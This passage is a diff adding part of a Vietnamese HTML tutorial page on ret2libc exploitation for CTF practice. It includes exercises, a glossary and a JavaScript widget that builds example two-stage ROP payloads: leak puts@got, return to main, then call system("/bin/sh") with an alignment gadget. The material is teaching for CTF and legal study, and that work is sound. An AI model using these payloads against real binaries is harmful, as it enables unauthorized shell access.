+  <div class="note"><span class="tag">one_gadget thay system</span>Thay vì <code>pop rdi; binsh; system</code>, có thể nhảy thẳng <code>one_gadget</code> (libc.address + 0xe3b01) nếu constraint thỏa — gọn hơn, khỏi lo rdi/binsh. Thử cả 3 gadget.</div>
+  <details><summary>▸ ret2libc không leak (ret2plt leak sẵn)</summary>
+  <div class="dc"><p>Nếu binary có sẵn hàm in (<code>puts</code> trong PLT) và GOT Partial RELRO, giai đoạn 1 luôn khả thi. Một số đề cho sẵn leak (in địa chỉ libc) → bỏ G1, vào thẳng G2. Hoặc dùng <a href="ret2dlresolve.html">ret2dlresolve</a> khi KHÔNG có hàm leak nào.</p></div></details>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · ret2libc có sẵn leak</div><p>Đề in địa chỉ libc: bỏ G1, gọi thẳng system("/bin/sh"). Luyện movaps align.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · 2 giai đoạn</div><p>Leak puts@got, rebase, quay main, gọi system. Chuẩn bài này.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · one_gadget</div><p>Thay system bằng one_gadget; thử 3 gadget tới khi constraint thỏa.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ret2libc</div><p>ROP gọi hàm libc.</p></div>
+    <div class="card"><div class="term">gadget</div><p>Đoạn lệnh kết thúc ret.</p></div>
+    <div class="card"><div class="term">pop rdi; ret</div><p>Đặt đối số đầu.</p></div>
+    <div class="card"><div class="term">PLT/GOT</div><p>Bàn nhảy / ô địa chỉ thật.</p></div>
+    <div class="card"><div class="term">movaps align</div><p>system cần rsp căn 0x10.</p></div>
+    <div class="card"><div class="term">one_gadget</div><p>Addr libc → execve("/bin/sh").</p></div>
+    <div class="card"><div class="term">leak</div><p>In địa chỉ libc để phá ASLR.</p></div>
+    <div class="card"><div class="term">rebase</div><p>base = leak − offset hàm.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Tiếp: <a href="rop_basics.html">rop_basics</a> · <a href="ret2csu.html">ret2csu</a> (khi thiếu pop rdi) · <a href="ret2dlresolve.html">ret2dlresolve</a> (không có leak).</li>
+    <li>Nền: <a href="leak_techniques.html">leak_techniques</a>. pwntools ROP docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 5.</strong> NX → ret2libc: leak puts@got (base = leak − 0x875a0 @2.31), quay main, pop rdi; "/bin/sh"; system. Nhớ ret-align (movaps). Tiếp theo: ROP cơ bản.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("r2l-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("r2l-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var stage=0, align=true;
+  var tg=document.getElementById("tg"), builder=document.getElementById("builder");
+  function render(){
+    var L=[];
+    L.push('# libc base (sau leak) = 0x7ffff7dc0000');
+    L.push('payload  = b"A"*72');
+    if(stage===0){
+      L.push('payload += p64(0x401263)      # pop rdi; ret');
+      L.push('payload += p64(0x404018)      # puts@got');
+      L.push('payload += p64(0x401064)      # puts@plt  → LEAK');
+      L.push('payload += p64(0x401186)      # main (lần 2)');
+    } else {
+      if(align) L.push('payload += p64(0x40101a)      # ret  (CĂN movaps)');
+      L.push('payload += p64(0x401263)      # pop rdi; ret');
+      L.push('payload += p64(0x7ffff7f745bd) # "/bin/sh" (base+0x1b45bd)');
+      L.push('payload += p64(0x7ffff7e12290) # system   (base+0x52290)');
+    }
+    builder.textContent = L.join("\n");
+    [].forEach.call(tg.children,function(b){
+      var g=b.getAttribute("data-g");
+      if(g==="0")b.classList.toggle("active",stage===0);
+      else if(g==="1")b.classList.toggle("active",stage===1);
+      else { b.classList.toggle("active",align); b.textContent="ret-align: "+(align?"BẬT":"TẮT"); }
+    });
+  }
+  tg.addEventListener("click",function(e){
+    var g=e.target.getAttribute("data-g"); if(g===null)return;
+    if(g==="0")stage=0; else if(g==="1")stage=1; else align=!align;
+    render();
+  });
+  render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
